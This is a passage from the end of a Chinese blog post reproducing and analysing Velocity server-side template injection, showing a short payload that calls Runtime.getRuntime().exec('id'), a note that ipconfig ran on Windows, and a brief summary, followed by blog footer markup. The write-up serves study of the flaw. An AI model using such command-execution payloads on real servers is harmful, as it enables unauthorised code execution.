+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rt = java.lang.Runtime.class</span><br><span class="line">chr = java.lang.String</span><br><span class="line">ex = java.lang.Runtime.getRuntime().exec(&quot;id&quot;)</span><br><span class="line">ex.waitFor()</span><br><span class="line">// 循环读取输出</span><br></pre></td></tr></table></figure>
+<p>在win上测试ipconfig成功</p>
+<p><img src="PYVKv7Unio_BKPIkrsOT9Jyztnwo_5vcvASGjUjbbIU.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>因为Spring框架版本的问题，高版本不能直接整合Velocity模板，一直报错踩坑</li>
+<li>Velocity模板目前也逐渐被其它模板引擎替代，如：Thymeleaf</li>
+</ul>
+<p><a href="SLmechCA4omG-VyIgYft1yVaqMiGgGSm2uUYQEIwXb8.zip">office</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#velocity%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">velocity的SSTI复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">常用语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#evaluate%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.1.</span> <span class="toc-text">evaluate触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#merge%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.2.</span> <span class="toc-text">merge触发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%A4%BA%E7%9A%84payload"><span class="toc-number">1.5.</span> <span class="toc-text">有回显示的payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&text=velocity的SSTI复现与分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&is_video=false&description=velocity的SSTI复现与分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=velocity的SSTI复现与分析&body=Check out this article: https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&name=velocity的SSTI复现与分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&t=velocity的SSTI复现与分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
